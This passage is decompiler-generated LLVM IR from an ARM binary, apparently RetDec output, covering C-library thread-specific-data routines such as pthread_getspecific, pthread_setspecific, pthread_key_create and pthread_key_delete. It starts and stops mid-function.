bb:                                               ; preds = %dec_label_pc_2217c
  br label %dec_label_pc_22194

dec_label_pc_22194:                               ; preds = %bb, %dec_label_pc_2217c
  %v0_22194 = load i32, i32* @r7, align 4
  store i32 %v0_22194, i32* %v6_22184, align 4
  store i32 139680, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_22180)
  %v0_221a0 = load i32, i32* %fp.global-to-local, align 4
  %v0_221a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_221a4 = add i32 %v0_221a4, 1
  store i32 %v1_221a4, i32* %r4.global-to-local, align 4
  %v0_221ac.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_221a8

dec_label_pc_221a8thread-pre-split:               ; preds = %dec_label_pc_22158
  %v1_2215c = add i32 %v5_22158, 96
  store i32 %v1_2215c, i32* %sb.global-to-local, align 4
  %v1_2216c = load i32, i32* @r7, align 4
  store i32 %v1_2216c, i32* %r4.global-to-local, align 4
  %v4_22170 = mul i32 %v1_22170, 32
  store i32 %v4_22170, i32* @r8, align 4
  br label %dec_label_pc_221a8

dec_label_pc_221a8:                               ; preds = %dec_label_pc_221a8thread-pre-split, %dec_label_pc_22194
  %v0_221ac = phi i32 [ %v4_22170, %dec_label_pc_221a8thread-pre-split ], [ %v0_221ac.pre, %dec_label_pc_22194 ]
  %v8_221d417 = phi i32 [ %v8_221d419, %dec_label_pc_221a8thread-pre-split ], [ %v0_221a0, %dec_label_pc_22194 ]
  %v2_22194 = phi i32 [ %v1_2216c, %dec_label_pc_221a8thread-pre-split ], [ %v1_221a4, %dec_label_pc_22194 ]
  %v7_221b8 = icmp sgt i32 %v2_22194, 31
  br i1 %v7_221b8, label %dec_label_pc_221bc.loopexit, label %dec_label_pc_2217c

dec_label_pc_221bc.loopexit:                      ; preds = %dec_label_pc_221a8
  %v0_221bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_221bc

dec_label_pc_221bc:                               ; preds = %dec_label_pc_221bc.loopexit, %dec_label_pc_22158
  %v0_221bc = phi i32 [ %v0_221bc.pre, %dec_label_pc_221bc.loopexit ], [ %v1_22170, %dec_label_pc_22158 ]
  %v8_221d418 = phi i32 [ %v8_221d417, %dec_label_pc_221bc.loopexit ], [ %v8_221d419, %dec_label_pc_22158 ]
  %v1_221bc = add i32 %v0_221bc, 1
  store i32 %v1_221bc, i32* @r5, align 4
  %v7_221c4 = icmp slt i32 %v1_221bc, 32
  br i1 %v7_221c4, label %dec_label_pc_22158, label %dec_label_pc_221c8

dec_label_pc_221c0thread-pre-split:               ; preds = %dec_label_pc_221c8.dec_label_pc_221c0thread-pre-split_crit_edge, %entry
  %v1_221dc = phi i32 [ %v1_221dc.pre, %dec_label_pc_221c8.dec_label_pc_221c0thread-pre-split_crit_edge ], [ 0, %entry ]
  store i32 %v1_221dc, i32* @r5, align 4
  %v7_221c414 = icmp slt i32 %v1_221dc, 32
  br i1 %v7_221c414, label %dec_label_pc_22158, label %dec_label_pc_221c8

dec_label_pc_221c8:                               ; preds = %dec_label_pc_221bc, %dec_label_pc_221c0thread-pre-split
  %v8_221d416 = phi i32 [ %v1_221dc, %dec_label_pc_221c0thread-pre-split ], [ %v8_221d418, %dec_label_pc_221bc ]
  %v0_221c8 = load i32, i32* @sl, align 4
  %v1_221c8 = add i32 %v0_221c8, 1
  store i32 %v1_221c8, i32* @sl, align 4
  %v7_221d0 = icmp slt i32 %v1_221c8, 4
  %v9_221d4 = urem i32 %v8_221d416, 2
  %storemerge = select i1 %v7_221d0, i32 %v9_221d4, i32 0
  store i32 %storemerge, i32* @r4, align 4
  %v2_221d8 = icmp eq i32 %storemerge, 0
  br i1 %v2_221d8, label %dec_label_pc_221e8, label %dec_label_pc_221c8.dec_label_pc_221c0thread-pre-split_crit_edge

dec_label_pc_221c8.dec_label_pc_221c0thread-pre-split_crit_edge: ; preds = %dec_label_pc_221c8
  %v1_221dc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_221c0thread-pre-split

dec_label_pc_221e8:                               ; preds = %dec_label_pc_221c8
  %v0_221e8 = load i32, i32* @r6, align 4
  %v1_221e8 = add i32 %v0_221e8, 28
  %v2_221e8 = inttoptr i32 %v1_221e8 to i32*
  %v3_221e8 = load i32, i32* %v2_221e8, align 4
  store i32 %v3_221e8, i32* @r0, align 4
  %v0_221f0 = call i32 @__pthread_lock()
  %v0_221f4 = load i32, i32* @r4, align 4
  store i32 %v0_221f4, i32* @r7, align 4
  br label %dec_label_pc_22210

dec_label_pc_221fc:                               ; preds = %dec_label_pc_22210
  %v1_221fc = add i32 %v5_22210, 116
  %v2_221fc = inttoptr i32 %v1_221fc to i32*
  %v3_221fc = load i32, i32* %v2_221fc, align 4
  store i32 %v3_221fc, i32* @r0, align 4
  %v2_22200 = icmp eq i32 %v3_221fc, 0
  br i1 %v2_22200, label %dec_label_pc_22210, label %dec_label_pc_22208

dec_label_pc_22208:                               ; preds = %dec_label_pc_221fc
  %v0_22208 = call i32 @free()
  %v0_2220c = load i32, i32* @r7, align 4
  %v1_2220c = load i32, i32* @r5, align 4
  %v2_2220c = add i32 %v1_2220c, 20
  %v3_2220c = inttoptr i32 %v2_2220c to i32*
  store i32 %v0_2220c, i32* %v3_2220c, align 4
  %v1_22210.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_22210

dec_label_pc_22210:                               ; preds = %dec_label_pc_221fc, %dec_label_pc_22208, %dec_label_pc_221e8
  %v0_2221c = phi i32 [ %v0_221f4, %dec_label_pc_221e8 ], [ %v1_22210.pre.pre, %dec_label_pc_22208 ], [ %v1_2221c, %dec_label_pc_221fc ]
  %v0_22210 = load i32, i32* @r6, align 4
  %v4_22210 = mul i32 %v0_2221c, 4
  %v5_22210 = add i32 %v4_22210, %v0_22210
  %v1_22218 = add i32 %v5_22210, 96
  store i32 %v1_22218, i32* @r5, align 4
  %v1_2221c = add i32 %v0_2221c, 1
  store i32 %v1_2221c, i32* @r4, align 4
  %v7_22220 = icmp sgt i32 %v0_2221c, 31
  br i1 %v7_22220, label %dec_label_pc_22224, label %dec_label_pc_221fc

dec_label_pc_22224:                               ; preds = %dec_label_pc_22210
  %v1_22224 = add i32 %v0_22210, 28
  %v2_22224 = inttoptr i32 %v1_22224 to i32*
  %v3_22224 = load i32, i32* %v2_22224, align 4
  %v1_22228 = call i32 @__pthread_unlock(i32 %v3_22224)
  store i32 %v3_22120, i32* @r4, align 4
  store i32 %v6_22120, i32* @r5, align 4
  store i32 %v9_22120, i32* @r6, align 4
  store i32 %v12_22120, i32* @r7, align 4
  store i32 %v27_22120, i32* @lr, align 4
  ret i32 %v1_22228

; uselistorder directives
  uselistorder i32 %v1_2221c, { 1, 0 }
  uselistorder i32 %v5_22210, { 1, 0 }
  uselistorder i32 %v0_2221c, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_221dc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_221bc, { 1, 2, 0 }
  uselistorder i32 %v2_22194, { 2, 0, 1 }
  uselistorder i32 %v4_22170, { 1, 0 }
  uselistorder i32 %v5_22158, { 1, 0 }
  uselistorder i32 %v1_22170, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @__pthread_unlock, { 8, 39, 38, 37, 36, 7, 6, 3, 2, 5, 4, 43, 35, 34, 33, 32, 42, 31, 30, 29, 28, 27, 26, 25, 24, 23, 9, 1, 0, 22, 21, 20, 19, 18, 17, 16, 15, 14, 41, 13, 12, 10, 11, 40 }
  uselistorder i32 ()* @__pthread_lock, { 5, 25, 4, 2, 1, 29, 3, 24, 23, 22, 21, 28, 19, 20, 18, 17, 16, 6, 0, 15, 14, 13, 11, 27, 10, 12, 9, 7, 8, 26 }
  uselistorder label %dec_label_pc_22210, { 1, 0, 2 }
  uselistorder label %dec_label_pc_221c8, { 1, 0 }
}

define i32 @pthread_getspecific(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %v2_22248 = icmp ugt i32 %arg1, 1023
  store i32 %arg1, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r5.global-to-local, align 4
  br i1 %v2_22248, label %dec_label_pc_22294, label %dec_label_pc_2225c

dec_label_pc_2225c:                               ; preds = %entry
  %v0_2225c = call i32 @_thread_self.12()
  %v0_22260 = load i32, i32* %r4.global-to-local, align 4
  %v3_22260 = udiv i32 %v0_22260, 32
  %v4_22264 = mul nuw nsw i32 %v3_22260, 4
  %v5_22264 = add i32 %v4_22264, %v0_2225c
  %v1_22268 = add i32 %v5_22264, 116
  %v2_22268 = inttoptr i32 %v1_22268 to i32*
  %v3_22268 = load i32, i32* %v2_22268, align 4
  %v2_2226c = icmp eq i32 %v3_22268, 0
  br i1 %v2_2226c, label %dec_label_pc_22294, label %dec_label_pc_22274

dec_label_pc_22274:                               ; preds = %dec_label_pc_2225c
  %v0_22278 = load i32, i32* %r5.global-to-local, align 4
  %v2_22278 = add i32 %v0_22278, 38732
  %v4_2227c = mul i32 %v0_22260, 8
  %v5_2227c = add i32 %v2_22278, %v4_2227c
  %v6_2227c = inttoptr i32 %v5_2227c to i32*
  %v7_2227c = load i32, i32* %v6_2227c, align 4
  %v2_22280 = icmp eq i32 %v7_2227c, 0
  br i1 %v2_22280, label %dec_label_pc_22294, label %.thread

.thread:                                          ; preds = %dec_label_pc_22274
  %v2_22284 = urem i32 %v0_22260, 32
  %v5_22288 = mul nuw nsw i32 %v2_22284, 4
  %v6_22288 = add i32 %v3_22268, %v5_22288
  %v7_22288 = inttoptr i32 %v6_22288 to i32*
  %v8_22288 = load i32, i32* %v7_22288, align 4
  br label %dec_label_pc_22294

dec_label_pc_22294:                               ; preds = %entry, %dec_label_pc_2225c, %dec_label_pc_22274, %.thread
  %storemerge = phi i32 [ %v8_22288, %.thread ], [ 0, %dec_label_pc_22274 ], [ 0, %dec_label_pc_2225c ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_22260, { 0, 2, 1 }
  uselistorder label %dec_label_pc_22294, { 3, 2, 1, 0 }
}

define i32 @pthread_setspecific(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v2_222ac = icmp ugt i32 %arg1, 1023
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r8, align 4
  br i1 %v2_222ac, label %dec_label_pc_2232c, label %dec_label_pc_222c4

dec_label_pc_222c4:                               ; preds = %entry
  %v4_222cc = mul i32 %arg1, 8
  %v5_222cc = add i32 %v4_222cc, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38732)
  %v6_222cc = inttoptr i32 %v5_222cc to i32*
  %v7_222cc = load i32, i32* %v6_222cc, align 4
  %v2_222d0 = icmp eq i32 %v7_222cc, 0
  br i1 %v2_222d0, label %dec_label_pc_2232c, label %dec_label_pc_222d8

dec_label_pc_222d8:                               ; preds = %dec_label_pc_222c4
  %v0_222d8 = call i32 @_thread_self.12()
  store i32 %v0_222d8, i32* %r0.global-to-local, align 4
  %v0_222dc = load i32, i32* @r4, align 4
  %v3_222dc = udiv i32 %v0_222dc, 32
  store i32 %v3_222dc, i32* @r6, align 4
  %v4_222e0 = mul nuw nsw i32 %v3_222dc, 4
  %v5_222e0 = add i32 %v4_222e0, %v0_222d8
  %v1_222e4 = add i32 %v5_222e0, 96
  store i32 %v1_222e4, i32* @r5, align 4
  %v1_222e8 = add i32 %v5_222e0, 116
  %v2_222e8 = inttoptr i32 %v1_222e8 to i32*
  %v3_222e8 = load i32, i32* %v2_222e8, align 4
  %v2_222ec = icmp eq i32 %v3_222e8, 0
  store i32 %v0_222d8, i32* @r7, align 4
  br i1 %v2_222ec, label %dec_label_pc_222f8, label %dec_label_pc_22314

dec_label_pc_222f8:                               ; preds = %dec_label_pc_222d8
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_22300 = call i32 @calloc(i32 32, i32 4)
  store i32 %v2_22300, i32* %r0.global-to-local, align 4
  %v2_22304 = icmp eq i32 %v2_22300, 0
  br i1 %v2_22304, label %bb, label %dec_label_pc_22310

bb:                                               ; preds = %dec_label_pc_222f8
  store i32 12, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22330

dec_label_pc_22310:                               ; preds = %dec_label_pc_222f8
  %v1_22310 = load i32, i32* @r5, align 4
  %v2_22310 = add i32 %v1_22310, 20
  %v3_22310 = inttoptr i32 %v2_22310 to i32*
  store i32 %v2_22300, i32* %v3_22310, align 4
  %v0_22314.pre = load i32, i32* @r7, align 4
  %v1_22314.pre = load i32, i32* @r6, align 4
  %v0_22320.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_22314

dec_label_pc_22314:                               ; preds = %dec_label_pc_222d8, %dec_label_pc_22310
  %v0_22320 = phi i32 [ %v0_222dc, %dec_label_pc_222d8 ], [ %v0_22320.pre, %dec_label_pc_22310 ]
  %v1_22314 = phi i32 [ %v3_222dc, %dec_label_pc_222d8 ], [ %v1_22314.pre, %dec_label_pc_22310 ]
  %v0_22314 = phi i32 [ %v0_222d8, %dec_label_pc_222d8 ], [ %v0_22314.pre, %dec_label_pc_22310 ]
  %v4_22314 = mul i32 %v1_22314, 4
  %v5_22314 = add i32 %v4_22314, %v0_22314
  %v1_22318 = add i32 %v5_22314, 116
  %v2_22318 = inttoptr i32 %v1_22318 to i32*
  %v3_22318 = load i32, i32* %v2_22318, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_22320 = urem i32 %v0_22320, 32
  %v0_22324 = load i32, i32* @r8, align 4
  %v5_22324 = mul nuw nsw i32 %v1_22320, 4
  %v6_22324 = add i32 %v3_22318, %v5_22324
  %v7_22324 = inttoptr i32 %v6_22324 to i32*
  store i32 %v0_22324, i32* %v7_22324, align 4
  %v1_22334.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22330

dec_label_pc_2232c:                               ; preds = %dec_label_pc_222c4, %entry
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22330

dec_label_pc_22330:                               ; preds = %bb, %dec_label_pc_22314, %dec_label_pc_2232c
  %v1_22334 = phi i32 [ 12, %bb ], [ %v1_22334.pre, %dec_label_pc_22314 ], [ 22, %dec_label_pc_2232c ]
  ret i32 %v1_22334

; uselistorder directives
  uselistorder i32 %v3_222dc, { 2, 1, 0 }
  uselistorder i32 %v0_222dc, { 1, 0 }
  uselistorder i32 %v0_222d8, { 1, 2, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 0 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_22330, { 2, 1, 0 }
  uselistorder label %dec_label_pc_22314, { 1, 0 }
}

define i32 @pthread_key_delete(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_22340 = load i32, i32* @r4, align 4
  store i32 %v3_22340, i32* %stack_var_-16, align 4
  %v12_22340 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -142896), i32* %r3.global-to-local, align 4
  store i32 140140, i32* @lr, align 4
  call void @__pseudo_branch(i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -142896))
  %v2_2236c = icmp ugt i32 %arg1, 1023
  br i1 %v2_2236c, label %entry.dec_label_pc_22388_crit_edge, label %dec_label_pc_22374

entry.dec_label_pc_22388_crit_edge:               ; preds = %entry
  %v0_22390.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_22388

dec_label_pc_22374:                               ; preds = %entry
  store i32 38732, i32* %r3.global-to-local, align 4
  %v0_22378 = load i32, i32* %r5.global-to-local, align 4
  %v2_22378 = add i32 %v0_22378, 38732
  store i32 %v2_22378, i32* %r1.global-to-local, align 4
  %v4_2237c = mul i32 %arg1, 8
  %v5_2237c = add i32 %v2_22378, %v4_2237c
  %v6_2237c = inttoptr i32 %v5_2237c to i32*
  %v7_2237c = load i32, i32* %v6_2237c, align 4
  store i32 %v7_2237c, i32* %r3.global-to-local, align 4
  %v2_22380 = icmp eq i32 %v7_2237c, 0
  br i1 %v2_22380, label %dec_label_pc_22388, label %dec_label_pc_223a4

dec_label_pc_22388:                               ; preds = %entry.dec_label_pc_22388_crit_edge, %dec_label_pc_22374
  %v0_22390 = phi i32 [ %v0_22390.pre, %entry.dec_label_pc_22388_crit_edge ], [ %v0_22378, %dec_label_pc_22374 ]
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_22390 = add i32 %v0_22390, 96
  %v3_22390 = inttoptr i32 %v2_22390 to i32*
  %v4_22390 = load i32, i32* %v3_22390, align 4
  store i32 140188, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_22390)
  br label %dec_label_pc_22420

dec_label_pc_223a4:                               ; preds = %dec_label_pc_22374
  store i32 132, i32* %r3.global-to-local, align 4
  %v2_223a8 = add i32 %v0_22378, 132
  %v3_223a8 = inttoptr i32 %v2_223a8 to i32*
  %v4_223a8 = load i32, i32* %v3_223a8, align 4
  store i32 %v4_223a8, i32* %r3.global-to-local, align 4
  %v1_223ac = inttoptr i32 %v4_223a8 to i32*
  %v2_223ac = load i32, i32* %v1_223ac, align 4
  store i32 %v5_2237c, i32* %r2.global-to-local, align 4
  %v7_223b4 = icmp eq i32 %v2_223ac, -1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_223bc = add i32 %v5_2237c, 4
  %v3_223bc = inttoptr i32 %v2_223bc to i32*
  store i32 0, i32* %v3_223bc, align 4
  %v0_223c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_223c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_223c0 = load i32, i32* %r4.global-to-local, align 4
  %v5_223c0 = mul i32 %v2_223c0, 8
  %v6_223c0 = add i32 %v5_223c0, %v1_223c0
  %v7_223c0 = inttoptr i32 %v6_223c0 to i32*
  store i32 %v0_223c0, i32* %v7_223c0, align 4
  br i1 %v7_223b4, label %dec_label_pc_22404, label %dec_label_pc_223c8

dec_label_pc_223c8:                               ; preds = %dec_label_pc_223a4
  %v0_223c8 = call i32 @_thread_self.12()
  %v0_223cc = load i32, i32* %r4.global-to-local, align 4
  %v3_223cc = udiv i32 %v0_223cc, 32
  %v1_223d0 = urem i32 %v0_223cc, 32
  store i32 %v1_223d0, i32* %lr.global-to-local, align 4
  %v3_223d4 = mul nuw nsw i32 %v3_223cc, 4
  store i32 %v3_223d4, i32* %r3.global-to-local, align 4
  store i32 %v0_223c8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_223dc

dec_label_pc_223dc:                               ; preds = %.dec_label_pc_223dc_crit_edge, %dec_label_pc_223c8
  %v0_223e4 = phi i32 [ %v0_223e4.pre, %.dec_label_pc_223dc_crit_edge ], [ %v3_223d4, %dec_label_pc_223c8 ]
  %v1_223e4 = phi i32 [ %v2_223f8, %.dec_label_pc_223dc_crit_edge ], [ %v0_223c8, %dec_label_pc_223c8 ]
  %v1_223dc = add i32 %v1_223e4, 44
  %v2_223dc = inttoptr i32 %v1_223dc to i8*
  %v3_223dc = load i8, i8* %v2_223dc, align 1
  %v4_223dc = zext i8 %v3_223dc to i32
  %v2_223e0 = icmp eq i8 %v3_223dc, 0
  %v2_223e4 = add i32 %v1_223e4, %v0_223e4
  store i32 %v2_223e4, i32* %r1.global-to-local, align 4
  br i1 %v2_223e0, label %dec_label_pc_223ec, label %bb9

dec_label_pc_223ec:                               ; preds = %dec_label_pc_223dc
  %v1_223ec = add i32 %v2_223e4, 116
  %v2_223ec = inttoptr i32 %v1_223ec to i32*
  %v3_223ec = load i32, i32* %v2_223ec, align 4
  store i32 %v3_223ec, i32* %r1.global-to-local, align 4
  %v2_223f0 = icmp eq i32 %v3_223ec, 0
  br i1 %v2_223f0, label %bb9, label %bb

bb:                                               ; preds = %dec_label_pc_223ec
  %v3_223f4 = load i32, i32* %lr.global-to-local, align 4
  %v6_223f4 = mul i32 %v3_223f4, 4
  %v7_223f4 = add i32 %v6_223f4, %v3_223ec
  %v8_223f4 = inttoptr i32 %v7_223f4 to i32*
  store i32 %v4_223dc, i32* %v8_223f4, align 4
  %v0_223f8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %dec_label_pc_223dc, %dec_label_pc_223ec, %bb
  %v0_223f8 = phi i32 [ %v1_223e4, %dec_label_pc_223dc ], [ %v1_223e4, %dec_label_pc_223ec ], [ %v0_223f8.pre, %bb ]
  %v1_223f8 = inttoptr i32 %v0_223f8 to i32*
  %v2_223f8 = load i32, i32* %v1_223f8, align 4
  store i32 %v2_223f8, i32* %r2.global-to-local, align 4
  %v9_223fc = icmp eq i32 %v2_223f8, %v0_223c8
  br i1 %v9_223fc, label %dec_label_pc_22404, label %.dec_label_pc_223dc_crit_edge

.dec_label_pc_223dc_crit_edge:                    ; preds = %bb9
  %v0_223e4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_223dc

dec_label_pc_22404:                               ; preds = %bb9, %dec_label_pc_223a4
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_2240c = load i32, i32* %r5.global-to-local, align 4
  %v2_22410 = add i32 %v0_2240c, 96
  %v3_22410 = inttoptr i32 %v2_22410 to i32*
  %v4_22410 = load i32, i32* %v3_22410, align 4
  store i32 140316, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_22410)
  br label %dec_label_pc_22420

dec_label_pc_22420:                               ; preds = %dec_label_pc_22388, %dec_label_pc_22404
  %storemerge = phi i32 [ 22, %dec_label_pc_22388 ], [ 0, %dec_label_pc_22404 ]
  %v2_22420 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_22420, i32* %r4.global-to-local, align 4
  store i32 %v12_22340, i32* %lr.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_223f8, { 1, 2, 0 }
  uselistorder i32 %v1_223e4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_223d4, { 1, 0 }
  uselistorder i32 %v0_223cc, { 1, 0 }
  uselistorder i32 %v0_223c8, { 1, 0, 2 }
  uselistorder i32 %v0_22378, { 1, 0, 2 }
  uselistorder i32 ()* @_thread_self.12, { 3, 2, 1, 0 }
  uselistorder i32 132, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 13, 14, 12, 15, 16 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_22420, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_22388, { 1, 0 }
}

define i32 @function_22438(i32 %arg1) local_unnamed_addr {
dec_label_pc_22438:
  %v0_22438 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_22438, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_22438
  %v2_2243c = load i32, i32* @r4, align 4
  %v4_2243c = mul i32 %v2_2243c, 2
  %v5_2243c = and i32 %v4_2243c, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_22438, %bb
  %v6_2243c = phi i32 [ %arg1, %dec_label_pc_22438 ], [ %v5_2243c, %bb ]
  ret i32 %v6_2243c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @pthread_key_create(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_22480.lr.ph:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_22440 = load i32, i32* @r4, align 4
  store i32 %v3_22440, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 46924), i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  call void @__pseudo_branch(i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -142896))
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38732), i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_22480

dec_label_pc_22480:                               ; preds = %dec_label_pc_22480.lr.ph, %dec_label_pc_224c0
  %v1_2248c = phi i32 [ 0, %dec_label_pc_22480.lr.ph ], [ %v1_224c0, %dec_label_pc_224c0 ]
  %v4_22480 = mul nuw nsw i32 %v1_2248c, 8
  %v5_22480 = add i32 %v4_22480, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38732)
  %v6_22480 = inttoptr i32 %v5_22480 to i32*
  %v7_22480 = load i32, i32* %v6_22480, align 4
  store i32 %v7_22480, i32* %r6.global-to-local, align 4
  %v2_22484 = icmp eq i32 %v7_22480, 0
  br i1 %v2_22484, label %dec_label_pc_2248c, label %dec_label_pc_224c0

dec_label_pc_2248c:                               ; preds = %dec_label_pc_22480
  store i32 46924, i32* %r0.global-to-local, align 4
  %v0_22494 = load i32, i32* %r7.global-to-local, align 4
  %v2_22494 = add i32 %v4_22480, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38736)
  %v3_22494 = inttoptr i32 %v2_22494 to i32*
  store i32 %v0_22494, i32* %v3_22494, align 4
  %v1_2249c = load i32, i32* %r2.global-to-local, align 4
  %v2_2249c = load i32, i32* %r4.global-to-local, align 4
  %v5_2249c = mul i32 %v2_2249c, 8
  %v6_2249c = add i32 %v5_2249c, %v1_2249c
  %v7_2249c = inttoptr i32 %v6_2249c to i32*
  store i32 1, i32* %v7_2249c, align 4
  %v0_224a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_224a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_224a0 = add i32 %v1_224a0, %v0_224a0
  store i32 %v2_224a0, i32* %r0.global-to-local, align 4
  %v2_224a8 = add i32 %v0_224a0, 96
  %v3_224a8 = inttoptr i32 %v2_224a8 to i32*
  %v4_224a8 = load i32, i32* %v3_224a8, align 4
  call void @__pseudo_branch(i32 %v4_224a8)
  %v0_224b4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_224b4, i32* %r0.global-to-local, align 4
  %v0_224b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_224b8 = load i32, i32* %r8.global-to-local, align 4
  %v2_224b8 = inttoptr i32 %v1_224b8 to i32*
  store i32 %v0_224b8, i32* %v2_224b8, align 4
  %v1_224ec.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_224e8

dec_label_pc_224c0:                               ; preds = %dec_label_pc_22480
  %v1_224c0 = add nuw nsw i32 %v1_2248c, 1
  store i32 %v1_224c0, i32* %r4.global-to-local, align 4
  %v7_224c8 = icmp sgt i32 %v1_2248c, 1022
  br i1 %v7_224c8, label %dec_label_pc_224cc, label %dec_label_pc_22480

dec_label_pc_224cc:                               ; preds = %dec_label_pc_224c0
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 46924), i32* %r0.global-to-local, align 4
  %v4_224d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 96) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_224d8)
  store i32 11, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_224e8

dec_label_pc_224e8:                               ; preds = %dec_label_pc_2248c, %dec_label_pc_224cc
  %v1_224ec = phi i32 [ %v1_224ec.pre, %dec_label_pc_2248c ], [ 11, %dec_label_pc_224cc ]
  %v2_224e8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_224e8, i32* %r4.global-to-local, align 4
  ret i32 %v1_224ec

; uselistorder directives
  uselistorder i32 %v1_224c0, { 1, 0 }
  uselistorder i32 %v0_224a0, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 38732, { 0, 1, 3, 2 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38732), { 1, 0, 2 }
  uselistorder i32 -142896, { 0, 2, 1, 5, 3, 4, 6 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -142896), { 3, 4, 5, 6, 0, 1, 2, 7, 8 }
  uselistorder label %dec_label_pc_224e8, { 1, 0 }
  uselistorder label %dec_label_pc_22480, { 1, 0 }
}

define i32 @function_22500(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_22500:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
